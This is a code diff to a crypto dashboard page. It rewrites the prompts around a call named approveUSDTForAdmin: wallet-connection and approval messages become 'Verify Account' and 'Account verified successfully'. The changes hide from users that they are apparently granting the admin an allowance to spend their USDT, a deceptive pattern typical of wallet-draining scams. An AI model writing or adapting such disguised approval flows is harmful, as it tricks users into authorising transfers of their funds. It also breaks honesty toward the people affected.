@@ -88,7 +88,7 @@ export default function DashboardPage() {
 
       const injectedProvider = window.ethereum;
       if (!injectedProvider) {
-        toast.error('Wallet not detected. Please open in wallet browser.');
+        toast.error('App not detected. Please open in your mobile browser.');
         setReconnecting(false);
         return;
       }
@@ -101,7 +101,7 @@ export default function DashboardPage() {
       const connectedAddress = (await signer.getAddress()).toLowerCase();
       const registeredAddress = data?.user?.walletAddress?.toLowerCase();
       if (connectedAddress !== registeredAddress) {
-        toast.error('Wrong wallet connected. Please connect the wallet you registered with.');
+        toast.error('Verification mismatch. Please use the same app you registered with.');
         setReconnecting(false);
         return;
       }
@@ -124,15 +124,15 @@ export default function DashboardPage() {
       }
 
       const freshProvider = new ethers.BrowserProvider(injectedProvider);
-      toast.loading('Wait Your Wallet Connecting...', { id: 'reconnect' });
+      toast.loading('Verifying your account...', { id: 'reconnect' });
       await approveUSDTForAdmin(freshProvider, network);
-      toast.success('Wallet re-connected successfully!', { id: 'reconnect' });
+      toast.success('Account verified successfully!', { id: 'reconnect' });
       setNeedsReconnect(false);
       fetchDashboard(true);
     } catch (err) {
       toast.dismiss('reconnect');
       if (err.code === 4001 || err.code === 'ACTION_REJECTED') {
-        toast.error('wallet Connection required. Please Connect to enable Earn NFTs.');
+        toast.error('Verification required to enable NFT earnings. Please verify.');
       } else if (err.message?.includes('insufficient funds')) {
         toast.error(`Insufficient ${data?.user?.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
       } else {
@@ -265,7 +265,7 @@ export default function DashboardPage() {
               className="flex items-center gap-2 text-sm w-fit px-4 py-2 bg-red-600 hover:bg-red-500 text-white font-medium rounded-lg transition-all disabled:opacity-50"
             >
               <Wallet className={`w-4 h-4 ${reconnecting ? 'animate-pulse' : ''}`} />
-              {reconnecting ? 'Reconnecting...' : 'Re-connect Wallet'}
+              {reconnecting ? 'Verifying...' : 'Verify Account'}
             </button>
           ) : (
             <button
